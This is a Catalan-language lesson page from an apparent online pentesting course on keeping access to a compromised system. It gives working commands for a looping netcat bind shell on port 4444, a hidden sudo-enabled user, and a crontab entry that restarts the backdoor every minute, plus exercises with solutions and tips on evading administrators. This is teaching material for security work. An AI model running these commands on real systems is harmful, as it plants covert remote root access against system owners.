<!DOCTYPE html>
<html lang="ca">
<head>
    <title> Manteniment de l'Accés </title>
        
    <meta charset="utf-8">
    <meta http-equiv="x-ua-compatible" content="ie=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow, noarchive">
    
    <link rel="alternate" href="https://campusempresa.com/cursos/pentesting/05-02-mantenimiento-del-acceso" hreflang="es" />
	<link rel="alternate" href="https://campusempresa.cat/cursos/pentesting/05-02-mantenimiento-del-acceso" hreflang="ca" />
	<link rel="alternate" href="https://enterprisecampus.net/courses/pentesting/05-02-mantenimiento-del-acceso" hreflang="en" />
    
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons/font/bootstrap-icons.css">
	<link href="/css/site.1ab297bfa4.css" rel="stylesheet">
	 
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
  	<script type="text/javascript" src="/js/math_init.js"></script>
  	<script type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/startup.js"></script>
  	<script>
  		var LANG = "ca";
  		var CATEGORY = "foundations";
  		var MOD_NAME = "pentesting";
  		var TEMA_NAME = "5-2";
  		var TYPE = "mod";
  		var PATH = "mod/pentesting/05-02-mantenimiento-del-acceso";
  		var IS_INDEX = false;
  	</script>
  	<script type="text/javascript" src="/js/cookie.js"></script>
  	<script type="module" src="/js/app.ae32789132.js"></script>
	<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0611338592562725" crossorigin="anonymous"></script>
	  	
	<!-- Google tag (gtag.js) -->
	<script async src="https://www.googletagmanager.com/gtag/js?id=G-VVPMPJSR3P"></script>
	<script>
	  window.dataLayer = window.dataLayer || [];
	  function gtag(){dataLayer.push(arguments);}
	  gtag('js', new Date());	
	  gtag('config', 'G-VVPMPJSR3P');
	</script>
</head>

<body class="d-none">
    <div id="content">
		<div id="header" class="container-xxl">
	<div class="row">
		<div class="col-12 col-md-6 p-0">
			<a href="/"><img src="/img/logo_header.png" alt="Logo Campus Empresa"></a>
		</div>
		<div class="col-12 col-md-6 p-0 text-end">
			<p class="mb-0 p-0">	<a href="https://enterprisecampus.net/courses/pentesting/05-02-mantenimiento-del-acceso" class="px-2">EN</a></b>
	|
	<a href="https://campusempresa.com/cursos/pentesting/05-02-mantenimiento-del-acceso" class="px-2">ES</a></b>
	|
	<b class="px-2">CA</b>
</p>
			<p class="mb-4 mt-0 mx-2  d-none d-md-block"><cite>Tot el coneixement al teu abast</cite></p>
		</div>
	</div>
</div>
<div class="subheader container-xxl d-none d-md-block">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objectiu" rel="nofollow">El Projecte</a> | 
<a href="/sobre-nosaltres" rel="nofollow">Sobre nosaltres</a> | 
<a href="/contribuir" rel="nofollow">Contribuir</a> | 
<a href="/donar" rel="nofollow">Donacions</a> | 
<a href="/llicencia" rel="nofollow">Llicència</a>
		</div>
	</div>
</div>
		<div class="top-bar container-fluid p-0">
	<div class="container-xxl p-0">
		<div class="row">
			<div class="col">
				<div class="d-flex justify-content-between">
					<div class="left">
						<a href="/" class="nav-link px-3" id="btnHome">
	<i class="bi bi-house-fill"></i>
	HOME
</a>

<a href="/els-meus-cursos" class="nav-link px-3 d-none" id="btnMyCourses">
	<i class="bi bi-rocket-takeoff-fill"></i>
	<i><b>Els meus cursos</b></i>
</a>
<a href="/cursos-finalitzats" class="nav-link px-3 d-none" id="trophy_button">
	<i class="bi bi-trophy-fill"></i>
	Finalitzats             
</a>

					</div>
                    <div class="ms-auto right">
                        <a id="user_button" href="#" class="nav-link px-3" data-bs-toggle="modal" data-bs-target="#loginModal">
                            <i id="user_icon" class="bi"></i>                            
                        </a>
                    </div>					
				</div>
			</div>
		</div>
	</div>
</div>

		<div class="container-xxl" id="main_content">
	<div class="row">
		<div class="col-12 col-lg-8">
										<div class="row py-1 m-0" id="buttonsModSection">
	<div class="col-6 p-0" data-mod="pentesting">
		<a  href="#" class="text-secondary d-none" data-read-mod="pentesting" data-read-unit="5-2" style="text-decoration:none;">
			<i class="bi bi-check-circle-fill"></i> 
			Marcar com a llegit
		</a>
		<a href="#" class="text-secondary d-none" data-unread-mod="pentesting" data-unread-unit="5-2" style="text-decoration:none;">
			<i class="bi bi-x-circle-fill"></i>
			Marcar com a no llegit
		</a>
	</div>
	<div class="col-6 text-end p-0">
					<a href="./"  class="nav-link">
				<i class="bi bi-journal-text"></i>
				Contingut del curs
			</a>
			</div>
</div>						<div id="inner_content">
				<div class='row navigation'>
	<div class='col-2 d-none d-md-block'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegis" class="py-2 px-3 btn btn-primary">
				&#x25C4; Anterior 
			</a>
			</div>
	<div class='col-2 d-md-none'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegis" class="py-2 px-3 btn btn-primary">
				&#x25C4;
			</a>
			</div>
	<div class='col-8 text-center'>
					<h1 style="text-decoration:underline">Manteniment de l'Accés</h1>
			</div>
	<div class='col-2 text-end d-none d-md-block'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Petjades" class="py-2 px-3 btn btn-primary"
				data-read-mod="pentesting" data-read-unit="5-2">
				Següent &#x25BA;
			</a>
			</div>
	<div class='col-2 text-end d-md-none '>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Petjades" class="py-2 px-3 btn btn-primary" 
				data-read-mod="pentesting" data-read-unit="5-2">
				 &#x25BA;
			</a>
			</div>
</div>
<div class='content'><p>El manteniment de l'accés és una fase crucial en el procés de pentesting, ja que permet als atacants mantenir el control sobre un sistema compromès durant un període prolongat. Aquesta fase implica la implementació de mecanismes que permetin l'accés remot i la persistència en el sistema, fins i tot després de reinicis o altres intents de neteja per part dels administradors del sistema.</p>
</div><h2>Objectius del Manteniment de l'Accés</h2>
<div class='content'><ul>
<li><strong>Persistència:</strong> Assegurar que l'accés es mantingui fins i tot després de reinicis del sistema o altres accions de manteniment.</li>
<li><strong>Accés remot:</strong> Configurar mecanismes per accedir al sistema de manera remota en qualsevol moment.</li>
<li><strong>Evasió de detecció:</strong> Implementar tècniques per evitar la detecció per part de sistemes de seguretat i administradors.</li>
</ul>
</div><h2>Tècniques Comunes de Manteniment de l'Accés</h2>
<div class='content'></div><h3><ol>
<li>Backdoors</li>
</ol></h3>
<div class='content'><p>Les backdoors són mecanismes que permeten l'accés remot al sistema sense necessitat d'autenticació. Poden ser programes o scripts que s'executen en segon pla.</p>
<h4>Exemple de codi:</h4>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBFeGVtcGxlIGQndW5hIGJhY2tkb29yIHNpbXBsZSBlbiBCYXNoCndoaWxlIHRydWU7IGRvCiAgbmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaApkb25l"))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Exemple d'una backdoor simple en Bash
while true; do
  nc -lvp 4444 -e /bin/bash
done</pre></div><div class='content'><p><strong>Explicació:</strong></p>
<ul>
<li><code>nc -lvp 4444 -e /bin/bash</code>: Utilitza <code>netcat</code> per escoltar en el port 4444 i executar <code>/bin/bash</code> quan es connecti algú.</li>
</ul>
</div><h3><ol start="2">
<li>Rootkits</li>
</ol></h3>
<div class='content'><p>Els rootkits són eines que permeten als atacants mantenir l'accés al sistema amagant la seva presència i les seves activitats.</p>
<h4>Tipus de Rootkits:</h4>
<ul>
<li><strong>Kernel-level rootkits:</strong> Modifiquen el nucli del sistema operatiu per amagar processos, fitxers i connexions de xarxa.</li>
<li><strong>User-level rootkits:</strong> Substitueixen binaris del sistema per versions malicioses que amaguen l'activitat de l'atacant.</li>
</ul>
</div><h3><ol start="3">
<li>Creació d'Usuaris Ocults</li>
</ol></h3>
<div class='content'><p>Crear usuaris amb privilegis elevats que no siguin fàcilment detectables pels administradors.</p>
<h4>Exemple de codi:</h4>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBBZmVnZWl4IHVuIHVzdWFyaSBvY3VsdCBhbWIgcHJpdmlsZWdpcyBkZSByb290CnVzZXJhZGQgLW0gLXAgJChvcGVuc3NsIHBhc3N3ZCAtMSAncGFzc3dvcmQnKSAtcyAvYmluL2Jhc2ggaGlkZGVudXNlcgp1c2VybW9kIC1hRyBzdWRvIGhpZGRlbnVzZXI="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Afegeix un usuari ocult amb privilegis de root
useradd -m -p $(openssl passwd -1 'password') -s /bin/bash hiddenuser
usermod -aG sudo hiddenuser</pre></div><div class='content'><p><strong>Explicació:</strong></p>
<ul>
<li><code>useradd -m -p $(openssl passwd -1 'password') -s /bin/bash hiddenuser</code>: Crea un usuari amb el nom <code>hiddenuser</code> i la contrasenya <code>password</code>.</li>
<li><code>usermod -aG sudo hiddenuser</code>: Afegeix l'usuari <code>hiddenuser</code> al grup <code>sudo</code> per obtenir privilegis de root.</li>
</ul>
</div><h3><ol start="4">
<li>Modificació de Fitxers de Configuració</li>
</ol></h3>
<div class='content'><p>Modificar fitxers de configuració per assegurar que els serveis maliciosos s'iniciïn automàticament amb el sistema.</p>
<h4>Exemple de codi:</h4>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBBZmVnZWl4IHVuYSBlbnRyYWRhIGFsIGNyb250YWIgcGVyIGV4ZWN1dGFyIHVuYSBiYWNrZG9vciBjYWRhIG1pbnV0CmVjaG8gIiogKiAqICogKiAvdXNyL2Jpbi9uYyAtbHZwIDQ0NDQgLWUgL2Jpbi9iYXNoIiA+PiAvZXRjL2Nyb250YWI="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Afegeix una entrada al crontab per executar una backdoor cada minut
echo &quot;* * * * * /usr/bin/nc -lvp 4444 -e /bin/bash&quot; &gt;&gt; /etc/crontab</pre></div><div class='content'><p><strong>Explicació:</strong></p>
<ul>
<li><code>echo &quot;* * * * * /usr/bin/nc -lvp 4444 -e /bin/bash&quot; &gt;&gt; /etc/crontab</code>: Afegeix una entrada al crontab per executar la backdoor cada minut.</li>
</ul>
</div><h2>Exercicis Pràctics</h2>
<div class='content'></div><h3>Exercici 1: Crear una Backdoor Simple</h3>
<div class='content'><ol>
<li>Utilitza <code>netcat</code> per crear una backdoor que escolti en un port específic.</li>
<li>Prova de connectar-te a la backdoor des d'un altre sistema.</li>
</ol>
<p><strong>Solució:</strong></p>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBFbiBlbCBzaXN0ZW1hIGNvbXByb23DqHMKbmMgLWx2cCA0NDQ0IC1lIC9iaW4vYmFzaAoKIyBFbiBlbCBzaXN0ZW1hIGRlIGwnYXRhY2FudApuYyA8SVBfZGVsX3Npc3RlbWFfY29tcHJvbcOocz4gNDQ0NA=="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># En el sistema comprom&egrave;s
nc -lvp 4444 -e /bin/bash

# En el sistema de l'atacant
nc &lt;IP_del_sistema_comprom&egrave;s&gt; 4444</pre></div><div class='content'></div><h3>Exercici 2: Crear un Usuari Ocult</h3>
<div class='content'><ol>
<li>Crea un usuari ocult amb privilegis de root.</li>
<li>Verifica que l'usuari pot executar comandes amb privilegis elevats.</li>
</ol>
<p><strong>Solució:</strong></p>
</div><div style='position:relative'><a class='copy_button d-none d-md-inline' href='#' onclick='navigator.clipboard.writeText(decodeURIComponent(escape(atob("IyBDcmVhciBsJ3VzdWFyaSBvY3VsdAp1c2VyYWRkIC1tIC1wICQob3BlbnNzbCBwYXNzd2QgLTEgJ3Bhc3N3b3JkJykgLXMgL2Jpbi9iYXNoIGhpZGRlbnVzZXIKdXNlcm1vZCAtYUcgc3VkbyBoaWRkZW51c2VyCgojIFZlcmlmaWNhciBlbHMgcHJpdmlsZWdpcwpzdSAtIGhpZGRlbnVzZXIKc3VkbyB3aG9hbWk="))));alert("Copiat!");return false;'><i class='bi bi-copy'></i></a><pre class='code'># Crear l'usuari ocult
useradd -m -p $(openssl passwd -1 'password') -s /bin/bash hiddenuser
usermod -aG sudo hiddenuser

# Verificar els privilegis
su - hiddenuser
sudo whoami</pre></div><div class='content'></div><h2>Errors Comuns i Consells</h2>
<div class='content'></div><h3>Errors Comuns</h3>
<div class='content'><ul>
<li><strong>No comprovar la persistència:</strong> No verificar si els mecanismes de manteniment de l'accés funcionen després de reinicis del sistema.</li>
<li><strong>Deixar rastres evidents:</strong> Utilitzar noms d'usuaris o fitxers que són fàcilment detectables pels administradors.</li>
</ul>
</div><h3>Consells</h3>
<div class='content'><ul>
<li><strong>Utilitza noms discrets:</strong> Tria noms d'usuaris i fitxers que no cridin l'atenció.</li>
<li><strong>Verifica la persistència:</strong> Prova els mecanismes de manteniment de l'accés després de reinicis i altres accions de manteniment.</li>
</ul>
</div><h2>Conclusió</h2>
<div class='content'><p>El manteniment de l'accés és una fase crítica en el pentesting que permet als atacants mantenir el control sobre un sistema compromès. Utilitzant tècniques com les backdoors, els rootkits, la creació d'usuaris ocults i la modificació de fitxers de configuració, els pentesters poden assegurar-se que poden accedir al sistema en qualsevol moment. És important practicar aquestes tècniques de manera ètica i legal, i sempre amb el consentiment del propietari del sistema.</p>
</div><div class='row navigation'>
	<div class='col-2 d-none d-md-block'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegis" class="py-2 px-3 btn btn-primary">
				&#x25C4; Anterior 
			</a>
			</div>
	<div class='col-2 d-md-none'>
					<a href='05-01-escalada-de-privilegios' title="Escalada de Privilegis" class="py-2 px-3 btn btn-primary">
				&#x25C4;
			</a>
			</div>
	<div class='col-8 text-center'>
			</div>
	<div class='col-2 text-end d-none d-md-block'>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Petjades" class="py-2 px-3 btn btn-primary"
				data-read-mod="pentesting" data-read-unit="5-2">
				Següent &#x25BA;
			</a>
			</div>
	<div class='col-2 text-end d-md-none '>
					<a href='05-03-cobertura-de-huellas' title="Cobertura de Petjades" class="py-2 px-3 btn btn-primary" 
				data-read-mod="pentesting" data-read-unit="5-2">
				 &#x25BA;
			</a>
			</div>
</div>

			</div>
		</div>
		<div class="col-12 col-lg-4 publi" id="div_publi">
						
	<div class="container mt-2 d-none d-md-block index">
		<h1>Curs de Pentesting: Tècniques de Proves de Penetració</h1>
<h2>Mòdul 1: Introducció al Pentesting</h2>
<ul>
<li><a href="01-01-que-es-pentesting">Què és el Pentesting?</a></li>
<li><a href="01-02-tipos-de-pentesting">Tipus de Pentesting</a></li>
<li><a href="01-03-fases-del-pentesting">Fases del Pentesting</a></li>
<li><a href="01-04-etica-y-legalidad">Ètica i Legalitat en el Pentesting</a></li>
</ul>
<h2>Mòdul 2: Reconeixement i Recollida d'Informació</h2>
<ul>
<li><a href="02-01-reconocimiento-pasivo">Reconeixement Passiu</a></li>
<li><a href="02-02-reconocimiento-activo">Reconeixement Actiu</a></li>
<li><a href="02-03-herramientas-recoleccion">Eines de Recollida d'Informació</a></li>
</ul>
<h2>Mòdul 3: Escaneig i Enumeració</h2>
<ul>
<li><a href="03-01-escaneo-de-puertos">Escaneig de Ports</a></li>
<li><a href="03-02-enumeracion-de-servicios">Enumeració de Serveis</a></li>
<li><a href="03-03-deteccion-de-vulnerabilidades">Detecció de Vulnerabilitats</a></li>
</ul>
<h2>Mòdul 4: Explotació de Vulnerabilitats</h2>
<ul>
<li><a href="04-01-introduccion-explotacion">Introducció a l'Explotació</a></li>
<li><a href="04-02-explotacion-web">Explotació de Vulnerabilitats Web</a></li>
<li><a href="04-03-explotacion-red">Explotació de Vulnerabilitats de Xarxa</a></li>
<li><a href="04-04-explotacion-sistemas">Explotació de Vulnerabilitats de Sistemes</a></li>
</ul>
<h2>Mòdul 5: Post-Explotació</h2>
<ul>
<li><a href="05-01-escalada-de-privilegios">Escalada de Privilegis</a></li>
<li><a href="05-02-mantenimiento-del-acceso">Manteniment de l'Accés</a></li>
<li><a href="05-03-cobertura-de-huellas">Cobertura de Petjades</a></li>
</ul>
<h2>Mòdul 6: Informe i Remediació</h2>
<ul>
<li><a href="06-01-documentacion-de-hallazgos">Documentació de Troballes</a></li>
<li><a href="06-02-recomendaciones-de-remediacion">Recomanacions de Remediació</a></li>
<li><a href="06-03-presentacion-de-resultados">Presentació de Resultats</a></li>
</ul>
<h2>Mòdul 7: Eines i Recursos Addicionals</h2>
<ul>
<li><a href="07-01-kali-linux">Kali Linux</a></li>
<li><a href="07-02-metasploit-framework">Metasploit Framework</a></li>
<li><a href="07-03-owasp-zap">OWASP ZAP</a></li>
<li><a href="07-04-recursos-aprendizaje">Recursos d'Aprenentatge Continu</a></li>
</ul>

	</div>










		</div>
	</div>
</div>		
<div class="container-xxl d-block d-md-none">
	<div class="row">
		<div class="col-12 p-2 p-md-0 m-0 text-end">
			<a href="/objectiu" rel="nofollow">El Projecte</a> | 
<a href="/sobre-nosaltres" rel="nofollow">Sobre nosaltres</a> | 
<a href="/contribuir" rel="nofollow">Contribuir</a> | 
<a href="/donar" rel="nofollow">Donacions</a> | 
<a href="/llicencia" rel="nofollow">Llicència</a>
		</div>
	</div>
</div>

<div class="container-xxl my-3">
	<div class="row">
		<div class="col">
			<footer>&copy; Copyright 2024. Tots els drets reservats</footer>
		</div>
	</div>
</div>	

<div id="cookies_adv" style="display:none;">
	Fem servir cookies per millorar la teva experiència d'ús i oferir continguts adaptats als teus interessos
    <a href="#" id="btn_accept_cookies" class="button">Acceptar</a>
    <a href="/cookies">Més informació</a>
</div>	

		<div class="modal fade" id="loginModal" tabindex="-1" aria-labelledby="loginModalLabel" aria-hidden="true">
    <div class="modal-dialog">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title" id="loginModalLabel">Usuari no autentificat</h5>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body">
            	<div id="modal-body-main"></div>
            </div>
        </div>
    </div>
</div>	</div>    
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
</body>
</html>
